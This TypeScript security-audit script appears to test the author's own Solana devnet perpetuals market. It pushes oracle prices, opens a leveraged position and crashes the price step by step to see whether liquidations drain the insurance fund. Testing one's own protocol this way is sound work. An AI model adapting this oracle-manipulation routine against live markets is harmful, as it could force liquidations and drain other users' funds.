/**
 * Security Audit: Insurance Fund Drain Attack
 *
 * Try to drain the insurance fund by creating bad debt through liquidations.
 */

import { Connection, Keypair, PublicKey, Transaction, ComputeBudgetProgram, sendAndConfirmTransaction, SYSVAR_CLOCK_PUBKEY } from "@solana/web3.js";
import { getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { fetchSlab, parseHeader, parseConfig, parseEngine, parseParams, parseUsedIndices, parseAccount, AccountKind } from "../src/solana/slab.js";
import { encodeKeeperCrank, encodePushOraclePrice, encodeTradeCpi, encodeDepositCollateral, encodeInitUser } from "../src/abi/instructions.js";
import { buildAccountMetas, ACCOUNTS_KEEPER_CRANK, ACCOUNTS_PUSH_ORACLE_PRICE, ACCOUNTS_TRADE_CPI, ACCOUNTS_DEPOSIT_COLLATERAL, ACCOUNTS_INIT_USER } from "../src/abi/accounts.js";
import { buildIx } from "../src/runtime/tx.js";
import fs from "fs";

const marketInfo = JSON.parse(fs.readFileSync("devnet-market.json", "utf-8"));
const PROGRAM_ID = new PublicKey(marketInfo.programId);
const SLAB = new PublicKey(marketInfo.slab);
const ORACLE = new PublicKey(marketInfo.oracle);
const VAULT = new PublicKey(marketInfo.vault);
const MINT = new PublicKey(marketInfo.mint);
const MATCHER_PROGRAM = new PublicKey(marketInfo.matcherProgramId);
const MATCHER_CTX = new PublicKey(marketInfo.lp.matcherContext);
const LP_PDA = new PublicKey(marketInfo.lp.pda);

const conn = new Connection("https://api.devnet.solana.com", "confirmed");
const payer = Keypair.fromSecretKey(
  new Uint8Array(JSON.parse(fs.readFileSync(process.env.HOME + "/.config/solana/id.json", "utf-8")))
);

async function getState() {
  const data = await fetchSlab(conn, SLAB);
  const vaultInfo = await conn.getAccountInfo(VAULT);
  return {
    header: parseHeader(data),
    config: parseConfig(data),
    engine: parseEngine(data),
    params: parseParams(data),
    data,
    vaultBalance: vaultInfo ? vaultInfo.lamports / 1e9 : 0,
  };
}

async function pushPrice(priceUsd: number): Promise<boolean> {
  const priceE6 = BigInt(Math.round(priceUsd * 1_000_000));
  const timestamp = BigInt(Math.floor(Date.now() / 1000));

  const data = encodePushOraclePrice({ priceE6, timestamp });
  const keys = buildAccountMetas(ACCOUNTS_PUSH_ORACLE_PRICE, [payer.publicKey, SLAB]);

  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 50_000 }),
    buildIx({ programId: PROGRAM_ID, keys, data })
  );

  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch (e: any) {
    console.log(`  PushPrice failed: ${e.message?.slice(0, 60)}`);
    return false;
  }
}

async function crank(): Promise<boolean> {
  const crankData = encodeKeeperCrank({ callerIdx: 65535, allowPanic: false });
  const crankKeys = buildAccountMetas(ACCOUNTS_KEEPER_CRANK, [
    payer.publicKey, SLAB, SYSVAR_CLOCK_PUBKEY, ORACLE,
  ]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 300000 }),
    buildIx({ programId: PROGRAM_ID, keys: crankKeys, data: crankData })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch (e: any) {
    console.log(`  Crank failed: ${e.message?.slice(0, 60)}`);
    return false;
  }
}

async function trade(userIdx: number, lpIdx: number, size: bigint): Promise<boolean> {
  const tradeData = encodeTradeCpi({ userIdx, lpIdx, size });
  const tradeKeys = buildAccountMetas(ACCOUNTS_TRADE_CPI, [
    payer.publicKey, payer.publicKey, SLAB, SYSVAR_CLOCK_PUBKEY, ORACLE,
    MATCHER_PROGRAM, MATCHER_CTX, LP_PDA,
  ]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
    buildIx({ programId: PROGRAM_ID, keys: tradeKeys, data: tradeData })
  );
  try {
    await sendAndConfirmTransaction(conn, tx, [payer], { commitment: "confirmed" });
    return true;
  } catch (e: any) {
    console.log(`  Trade failed: ${e.message?.slice(0, 100)}`);
    return false;
  }
}

async function main() {
  console.log("=== INSURANCE FUND DRAIN ATTACK TEST ===\n");

  // Get initial state
  const { engine: initialEngine, params, vaultBalance: initialVault } = await getState();
  const initialInsurance = Number(initialEngine.insuranceFund.balance) / 1e9;

  console.log("=== INITIAL STATE ===");
  console.log(`Vault: ${initialVault.toFixed(9)} SOL`);
  console.log(`Insurance Fund: ${initialInsurance.toFixed(9)} SOL`);
  console.log(`Lifetime Liquidations: ${initialEngine.lifetimeLiquidations.toString()}`);
  console.log(`Lifetime Force Closes: ${initialEngine.lifetimeForceCloses.toString()}`);
  console.log(`\nRisk Parameters:`);
  console.log(`  Maintenance Margin: ${Number(params.maintenanceMarginBps)} bps (${Number(params.maintenanceMarginBps) / 100}%)`);
  console.log(`  Initial Margin: ${Number(params.initialMarginBps)} bps`);
  console.log(`  Liquidation Fee: ${Number(params.liquidationFeeBps)} bps`);

  // Set baseline price and crank
  console.log("\n=== SETUP ===");
  console.log("Setting price to $150 and running cranks...");
  await pushPrice(150);
  for (let i = 0; i < 16; i++) await crank();

  // Check accounts with positions
  const { data, engine } = await getState();
  const indices = parseUsedIndices(data);

  console.log("\n=== ACCOUNTS WITH POSITIONS ===");
  for (const idx of indices) {
    const acc = parseAccount(data, idx);
    if (!acc || acc.positionSize === 0n) continue;
    const kind = acc.kind === AccountKind.LP ? "LP" : "USER";
    const dir = acc.positionSize > 0n ? "LONG" : "SHORT";
    const capital = Number(acc.capital) / 1e9;
    const pnl = Number(acc.pnl) / 1e9;
    console.log(`  [${idx}] ${kind} ${dir} ${acc.positionSize.toString()} capital:${capital.toFixed(6)} pnl:${pnl.toFixed(6)}`);
  }

  // Try to create a highly leveraged position
  console.log("\n=== CREATING LEVERAGED POSITION ===");

  // Find a user account
  let userIdx = -1;
  for (const idx of indices) {
    const acc = parseAccount(data, idx);
    if (acc && acc.kind === AccountKind.User && acc.owner.equals(payer.publicKey)) {
      userIdx = idx;
      break;
    }
  }

  if (userIdx < 0) {
    console.log("No user account found");
    return;
  }

  const userAcc = parseAccount(data, userIdx);
  const userCapital = userAcc ? Number(userAcc.capital) / 1e9 : 0;
  console.log(`Using account ${userIdx} with ${userCapital.toFixed(6)} SOL capital`);

  // Calculate max position for 10x leverage (inverted market)
  // At 10% initial margin, max notional = capital / 0.1 = capital * 10
  // Position size in units depends on price
  // For inverted at $150, price_e6 = 150_000_000
  // notional = position_size * price_e6 / 1e6

  // Try opening a position
  const positionSize = 5000000n; // 5M units
  console.log(`\nTrying to open LONG position of ${positionSize.toString()} units...`);

  const tradeSuccess = await trade(userIdx, 0, positionSize);
  if (tradeSuccess) {
    console.log("Position opened!");
  } else {
    console.log("Failed to open position - trying smaller size...");
    const smallerSuccess = await trade(userIdx, 0, 1000000n);
    if (smallerSuccess) {
      console.log("Smaller position opened!");
    }
  }

  // Check position
  const { data: data2, engine: engine2 } = await getState();
  const accAfterTrade = parseAccount(data2, userIdx);
  if (accAfterTrade && accAfterTrade.positionSize !== 0n) {
    console.log(`\nPosition: ${accAfterTrade.positionSize.toString()}`);
    console.log(`Entry Price E6: ${accAfterTrade.entryPriceE6?.toString() || 'N/A'}`);
  }

  // Now crash the price to try to liquidate
  console.log("\n=== PRICE CRASH TEST ===");
  const crashPrices = [120, 100, 80, 60, 40, 20, 10, 5];

  for (const price of crashPrices) {
    console.log(`\nPushing price to $${price}...`);
    await pushPrice(price);

    // Run cranks to process any liquidations
    console.log("Running cranks...");
    for (let i = 0; i < 8; i++) {
      await crank();
    }

    const { engine: e, data: d } = await getState();
    const insurance = Number(e.insuranceFund.balance) / 1e9;
    const liqCount = Number(e.lifetimeLiquidations);
    const forceCount = Number(e.lifetimeForceCloses);

    console.log(`  Insurance: ${insurance.toFixed(9)} SOL (Δ ${(insurance - initialInsurance).toFixed(6)})`);
    console.log(`  Liquidations: ${liqCount}, Force closes: ${forceCount}`);

    // Check if user account still has position
    const userNow = parseAccount(d, userIdx);
    if (userNow) {
      const pos = userNow.positionSize;
      const cap = Number(userNow.capital) / 1e9;
      const pnl = Number(userNow.pnl) / 1e9;
      console.log(`  User: pos=${pos.toString()} cap=${cap.toFixed(6)} pnl=${pnl.toFixed(6)}`);

      if (pos === 0n && userNow.positionSize !== 0n) {
        console.log("  *** USER POSITION LIQUIDATED ***");
      }
    }

    // Check if insurance fund depleted
    if (insurance < 0.01) {
      console.log("\n*** INSURANCE FUND NEARLY DEPLETED ***");
      break;
    }
  }

  // Restore price
  console.log("\n=== RESTORING PRICE ===");
  await pushPrice(150);
  for (let i = 0; i < 16; i++) await crank();

  // Final state
  const { engine: finalEngine, vaultBalance: finalVault } = await getState();
  const finalInsurance = Number(finalEngine.insuranceFund.balance) / 1e9;

  console.log("\n=== FINAL STATE ===");
  console.log(`Vault: ${initialVault.toFixed(9)} -> ${finalVault.toFixed(9)} SOL (Δ ${(finalVault - initialVault).toFixed(6)})`);
  console.log(`Insurance: ${initialInsurance.toFixed(9)} -> ${finalInsurance.toFixed(9)} SOL (Δ ${(finalInsurance - initialInsurance).toFixed(6)})`);
  console.log(`Lifetime Liquidations: ${initialEngine.lifetimeLiquidations.toString()} -> ${finalEngine.lifetimeLiquidations.toString()}`);
  console.log(`Lifetime Force Closes: ${initialEngine.lifetimeForceCloses.toString()} -> ${finalEngine.lifetimeForceCloses.toString()}`);

  // Summary
  console.log("\n=== ATTACK SUMMARY ===");
  const insuranceDrained = initialInsurance - finalInsurance;
  if (insuranceDrained > 0.01) {
    console.log(`Insurance drained: ${insuranceDrained.toFixed(9)} SOL`);
    console.log("ATTACK PARTIALLY SUCCESSFUL - some insurance was used");
  } else {
    console.log("Insurance fund remained stable");
    console.log("ATTACK FAILED - could not drain insurance");
  }
}

main().catch(console.error);
